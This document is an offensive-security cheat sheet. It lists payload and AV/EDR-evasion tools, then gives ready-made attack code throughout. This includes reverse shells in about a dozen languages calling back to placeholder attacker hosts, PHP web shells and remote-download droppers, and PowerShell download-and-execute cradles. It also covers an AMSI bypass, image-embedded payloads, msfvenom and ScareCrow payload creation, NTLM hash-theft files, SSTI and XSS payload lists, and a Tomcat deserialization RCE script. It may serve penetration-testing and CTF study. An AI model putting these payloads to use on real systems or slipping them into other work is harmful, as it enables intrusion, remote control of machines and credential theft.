# Payloads

| Name | Description | URL |
| --- | --- | --- |
| Payload Box | Payload Collection | https://github.com/payloadbox |
| phpgcc | PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. | https://github.com/ambionics/phpggc |
| woodpecker | Log4j jndi injects the Payload generator | https://github.com/woodpecker-appstore/log4j-payload-generator |
| marshalsec | Java Unmarshaller Security | https://github.com/mbechler/marshalsec |
| ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |
| ysoserial.net | Deserialization payload generator for a variety of .NET formatters | https://github.com/pwntester/ysoserial.net |
| nishang | Offensive PowerShell for red team, penetration testing and offensive security. | https://github.com/samratashok/nishang |
| Shikata Ga Nai | Shikata ga nai (仕方がない) encoder ported into go with several improvements. | https://github.com/EgeBalci/sgn |
| unicorn | Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18. | https://github.com/trustedsec/unicorn |
| Chimera | Chimera is a PowerShell obfuscation script designed to bypass AMSI and commercial antivirus solutions. | https://github.com/tokyoneon/Chimera |
| charlotte | c++ fully undetected shellcode launcher ;) | https://github.com/9emin1/charlotte |
| Mortar Loader | Evasion technique to defeat and divert detection and prevention of security products (AV/EDR/XDR) | https://github.com/0xsp-SRD/mortar |
| ntlm_theft | A tool for generating multiple types of NTLMv2 hash theft files. | https://github.com/Greenwolf/ntlm_theft |
| EXE_to_DLL | Converts a EXE into DLL | https://github.com/hasherezade/exe_to_dll |
| Veil | Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions. | https://github.com/Veil-Framework/Veil |
| Donut | Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters. | https://github.com/TheWover/donut |
| Freeze | Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods | https://github.com/optiv/Freeze |
| ScareCrow | Payload creation framework designed around EDR bypass. | https://github.com/optiv/ScareCrow |
| nim-strenc | A tiny library to automatically encrypt string literals in Nim code | https://github.com/Yardanico/nim-strenc |
| Nimcrypt2 | .NET, PE, & Raw Shellcode Packer/Loader Written in Nim | https://github.com/icyguider/Nimcrypt2 |
| NimHollow | Nim implementation of Process Hollowing using syscalls (PoC) | https://github.com/snovvcrash/NimHollow |
| SysWhispers | SysWhispers helps with evasion by generating header/ASM files implants can use to make direct system calls. | https://github.com/m57/SysWhispers |
| NimlineWhisperer2 | A tool for converting SysWhispers2 syscalls for use with Nim projects | https://github.com/ajpc500/NimlineWhispers2 |
| OffensiveNim | Experiments in weaponizing Nim for implant development and general offensive operations. | https://github.com/0xsyr0/OffensiveNim |
| OffensiveRust | Rust Weaponization for Red Team Engagements. | https://github.com/trickster0/OffensiveRust |
| OffensivePipeline | OffensivePipeline allows to download, compile (without Visual Studio) and obfuscate C# tools for Red Team exercises.  | https://github.com/Aetsu/OffensivePipeline |
| PSByPassCLM | Bypass for PowerShell Constrained Language Mode | https://github.com/padovah4ck/PSByPassCLM |
| Invoke-Obfuscation | PowerShell Obfuscator | https://github.com/danielbohannon/Invoke-Obfuscation |
| mimikatz Obfuscator | This script downloads and slightly "obfuscates" the mimikatz project. | https://gist.github.com/imaibou/92feba3455bf173f123fbe50bbe80781 |
| Simple Injector | A simple injector that uses LoadLibraryA | https://github.com/tomcarver16/SimpleInjector |
| AmsiHook | AmsiHook is a project I created to figure out a bypass to AMSI via function hooking. | https://github.com/tomcarver16/AmsiHook |
| DefenderCheck | Identifies the bytes that Microsoft Defender flags on. | https://github.com/matterpreter/DefenderCheck |
| AMSI.fail | AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. | http://amsi.fail |
| AmsiScanBufferBypass | Bypass AMSI by patching AmsiScanBuffer | https://github.com/rasta-mouse/AmsiScanBufferBypass |
| AMSI Bypass Powershell | This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance methods i found on different Blog Posts. | https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell |
| Raikia's Hub | Online repository for Red Teamers | https://raikia.com/tool-powershell-encoder/ |
| hoaxshell | An unconventional Windows reverse shell, currently undetected by Microsoft Defender and various other AV solutions, solely based on http(s) traffic. | https://github.com/t3l3machus/hoaxshell |
| PHP-Reverse-Shell | PHP shells that work on Linux OS, macOS, and Windows OS. | https://github.com/ivan-sincek/php-reverse-shell |
| webshell | This is a webshell open source project | https://github.com/tennc/webshell |
| WebShell | Webshell && Backdoor Collection | https://github.com/xl7dev/WebShell |
| Weevely | Weaponized web shell | https://github.com/epinna/weevely3 |
| Intruder Payloads | A collection of Burpsuite Intruder payloads, BurpBounty payloads, fuzz lists, malicious file uploads and web pentesting methodologies and checklists. | https://github.com/1N3/IntruderPayloads |
| PayloadsAllTheThings | A list of useful payloads and bypass for Web Application Security and Pentest/CTF. | https://github.com/swisskyrepo/PayloadsAllTheThings |

## AMSI

### Test String

```c
PS C:\> $str = 'amsiinitfailed'
```

### Bypass

```c
PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
```

## Bash Reverse Shell

```c
$ bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
$ bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
$ echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
```

## curl Reverse Shell

```c
$ curl --header "Content-Type: application/json" --request POST http://<RHOST>:<RPORT>/upload --data '{"auth": {"name": "<USERNAME>", "password": "<PASSWORD>"}, "filename" : "& echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"|base64 -d|bash"}'
```

### With JWT Token

```c
$ curl -i -s -k -X $'POST' -H $'Host: api.<RHOST>' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzIyMjk2LCJleHAiOjE2MzI5MTQyOTZ9.y8GGfvwe1LPGOGJUVjmzMIsZaR5aok60X6fmEnAHvMg' -H $'Content-Type: application/json' -H $'Origin: http://api.<RHOST>' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f)\",\"port\":\"1337\"\}' $'http://api.<RHOST>/admin/plugins/install' --proxy http://127.0.0.1:8080
```

## Donut

> https://github.com/TheWover/donut

### Installation

```c
$ make
$ make clean
$ make debug
```

### Obfuscation

```c
$ donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
```

## Exiftool

### PHP into JPG Injection

```c
$ exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg
$ exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' <FILE>.jpeg
$ exiftool "-comment<=back.php" back.png
$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
```

## GhostScript

```c
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```

## GIF

### Magic Byte

Add `GIF8` on line `1` of for example a php shell to get the file recognized as a gif file. Even when you name it `shell.php`.

## iconv

### Converting Payload to Windows Encoding

```c
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://<LHOST>:<LPORT>/revshell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
```

```c
C:\> runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADkAOgA4ADAALwByAGUAdgBzAGgAZQBsAGwALgBwAHMAMQAnACkA"
```

## JAVA Reverse Shell

```c
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

$ r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

### shell.jar

```c
package <NAME>;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Main extends JavaPlugin {
   @Override
   public void onDisable() {
     super.onDisable();
   }

@Override
public void onEnable() {
  final String PHP_CODE = "<?php system($_GET['cmd']); ?>";
  try {
   Files.write(Paths.get("/var/www/<TARGET_DOMAIN>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
   } catch (IOException e) {
     e.printStackTrace();
   }

   super.onEnable();
  }
}
```

## JDWP

### Remote Code Execution (RCE)

```c
$ print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("whoami").getInputStream())).readLine())
```

## Lua Reverse Shell

```c
http://<TARGET_URL>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
```

## LNK Files

> https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence

### lnkfilegen.ps1

```c
$path                      = "$([Environment]::GetFolderPath('Desktop'))\<FILE>.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"

$shortcut.TargetPath       = "cmd.exe"
$shortcut.Arguments        = "/c explorer.exe Z:\PATH\TO\SHARE & \\<LHOST>\foobar"
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey           = "CTRL+C"
$shortcut.Description      = ""

$shortcut.WindowStyle      = 7
                           # 7 = Minimized window
                           # 3 = Maximized window
                           # 1 = Normal    window
$shortcut.Save()

#(Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)
```

## Markdown Reverse Shell

```c
--';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
```

## mkfifo Reverse Shell

```c
$ mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
```

## Netcat Reverse Shell

```c
$ nc -e /bin/sh <LHOST> <LPORT>
```

## nishang

> https://github.com/samratashok/nishang

### Reverse-TCP Shell for Windows

```c
$ cd PATH/TO/nishang/Shells/
$ cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
```

Choose which variant you require, copy and put it at the end of the file.

```c
tail -3 Invoke-PowerShellTcp.ps1 
}

Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
```

```c
C:\> powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
```

## PDF

### Magic Bytes

```c
%PDF-1.5
<PAYLOAD>
%%EOF
```

## Perl Reverse Shell

```c
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## PHP Web Shell

```c
<?php system($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo system($_REQUEST['shell']): ?>
```

### Sanity Check

```c
<?php echo "test";?>
```

### Shell

```c
$ php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Upload

```c
<?php file_put_contents($_GET['upload'], file_get_contents("http://<LHOST>:<LPORT>/" . $_GET['upload']); ?>
```

### Upload and Execution

```c
<?php if (isset($_GET['upload'])) {file_put_contents($_GET['upload'], file_get_contents("http://<LHOST>:<LPORT>/" . $_GET['upload'])); }; if (isset($_GET['cmd'])) { system($_GET['cmd']); };?>
```

### Code

```c
$sock=fsockopen("<LHOST>", <LPORT>);
exec("/bin/sh -i <&3 >&3 2>&3");
```

### Embedded in .png-File

```c
$ echo '<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' >> shell.php.png
```

## PowerShell Reverse Shell

```c
$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```c
$ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```c
$  powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

### minireverse.ps1

```c
$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
```

## Python Reverse Shell

```c
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
$ python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
$ echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE><(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE>
```

## Remote File Inclusion (RFI)

```c
<?php
exec("bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'");
?>
```

## Ruby Reverse Shell

```c
$ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## ScareCrow

> https://github.com/optiv/ScareCrow

### Payloads

#### Shellcode Payload Creation with msfvenom

```c
$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f raw -o <FILE>.bin
```

#### .msi-File Payload Creation with msfvenom

```c
$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f exe -o <FILE>.exe
```

### Listener

```c
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_https
```

### Obfuscation

#### DLL Side-Loading

```c
$ ScareCrow -I <FILE>.bin -Loader dll -domain <FAKE_DOMAIN>
```
#### Windows Script Host

```c
$ ScareCrow -I <FILE>.bin -Loader msiexec -domain <FAKE_DOMAIN> -O payload.js
```

#### Control Panel Files

```c
$ ScareCrow -I <FILE>.bin -Loader control -domain <FAKE_DOMAIN>
```

### Renaming Payload

```c
$ mv <FILE>.dll <FILE>32.dll
```

### Execution

```c
PS C:\> rundll32.exe .\<FILE>32.dll,DllRegisterServer
```

or

```c
PS C:\> regsvr32 /s .\<FILE>32.dll
```

For `.cpl-Files` a simple double click is enough to execute them.

## SMB .scf-File

### Getting Hashes for Responder by uploading .scf-files

```c
[Shell]
Command=2
IconFile=\\<LHOST>\payload.ico
[Taskbar]
Command=ToggleDesktop
```

## Spoofing Office Marco

> https://github.com/christophetd/spoofing-office-macro

## Server-Side Template Injection (SSTI)

> https://github.com/payloadbox/ssti-payloads

```c
{{2*2}}[[3*3]]
{{3*3}}
{{3*'3'}}
<%= 3 * 3 %>
${6*6}
${{3*3}}
@(6+5)
#{3*3}
#{ 3 * 3 }
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
<%= File.open('/etc/passwd').read %>
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{$smarty.version}
{php}echo `id`;{/php}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

## XSS

> https://github.com/payloadbox/xss-payload-list

### Basic Payloads

```c
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script src="http://<LHOST>/<FILE>"></script>
```

### IMG Payloads

```c
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
```

### SVG Payloads

```c
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
```

### DIV Payloads

```c
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

## xterm Reverse Shell

The following command should be run on the server. It will try to connect back <LHOST> on port `6001/TCP`.

```c
$ xterm -display <LHOST>:1
```

To catch the incoming xterm, start an X-Server on attacker machine (:1 – which listens on port `6001/TCP`.

```c
$ Xnest :1
$ xhost +10.10.10.211
```


## ysoserial

> https://github.com/frohoff/ysoserial

> https://github.com/pwntester/ysoserial.net

```c
$ java -jar ysoserial-master-SNAPSHOT.jar
```

### Create Reverse Shell

```c
$ java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <LHOST> <LPORT> -e /bin/sh' | base64 -w 0
$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
```

### Apache Tomcat RCE by Deserialization Skeleton Script

```c
filename=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
ip=$1
port=$2
cmd="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
jex="bash -c {echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"
java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$filename.session
curl -s -F "data=@/tmp/$filename.session" http://<RHOST>:8080/upload.jsp?email=test@mail.com > /dev/null
curl -s http://<RHOST>:8080/ -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$filename" > /dev/null
```

```c
$ ./shell.sh <RHOST> <RPORT>
```
